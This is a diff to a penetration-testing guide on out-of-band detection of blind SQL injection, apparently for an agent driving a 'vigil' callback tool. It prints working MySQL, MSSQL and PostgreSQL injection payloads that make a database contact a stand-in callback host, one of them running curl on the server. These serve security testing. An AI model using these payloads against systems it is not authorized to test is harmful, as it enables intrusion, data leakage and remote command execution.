@@ -98,11 +98,13 @@ START
   v
 [3d] Out-of-Band (when time-based is unreliable)
   |-- Requires OOB callback infrastructure. Confirm with `vigil oob status --json`.
-  |-- Mint a nonce-tagged host, embed it, then poll for the correlated hit
-  |     (replaces reading the listener log by hand). See "Out-of-Band Correlation" below.
-  |-- MySQL:  ' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.<NONCE_HOST>\\a'))--
-  |-- MSSQL:  '; EXEC master..xp_dirtree '\\<NONCE_HOST>\a'--
-  |-- PG:     '; COPY (SELECT version()) TO PROGRAM 'curl http://<NONCE_HOST>/'--
+  |-- Mint a nonce-tagged host (`vigil oob mint --client <name>` binds it under a
+  |     running client's id and prints the exact host), embed that exact host, then
+  |     poll for the correlated hit (replaces reading the listener log by hand).
+  |     See "Out-of-Band Correlation" below.
+  |-- MySQL:  ' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.$OOB_HOST\\a'))--
+  |-- MSSQL:  '; EXEC master..xp_dirtree '\\$OOB_HOST\a'--
+  |-- PG:     '; COPY (SELECT version()) TO PROGRAM 'curl http://$OOB_HOST/'--
   |-- OOB is the most reliable blind detection method when available.
   |-- MySQL LOAD_FILE requires FILE privilege (disabled by default since 5.7.6
   |     with secure_file_priv). MSSQL xp_dirtree works on most default installs.
@@ -113,12 +115,12 @@ START
 Mint a unique callback host per injection point and let the correlator bind the hit to the probe — never eyeball the listener log:
 
 ```bash
-vigil oob mint --technique sqli --target-url "https://target/item?id=1" --param id --probe-kind dns
+vigil oob mint --client <name> --technique sqli --target-url "https://target/item?id=1" --param id --probe-kind dns
 # -> nonce  <prefix>-<token>
-#    dns    <prefix>-<token>.researcher.example   (use as <NONCE_HOST> above)
+#    dns    <prefix>-<token>.<client-id>.researcher.example   (= $OOB_HOST above)
 ```
 
-Substitute the minted host for `<NONCE_HOST>` in the payloads above (xp_dirtree is the single most reliable vector — not disabled by default, no sysadmin needed), deliver via the kali exec wrapper, then:
+Substitute the EXACT host `vigil oob mint --client <name>` prints (`$OOB_HOST` — the nonce bound under the client id; never hand-build a bare `<nonce>.oob...` host) for `$OOB_HOST` in the payloads above (xp_dirtree is the single most reliable vector — not disabled by default, no sysadmin needed), deliver via the kali exec wrapper, then:
 
 ```bash
 vigil oob poll --client <name> --json
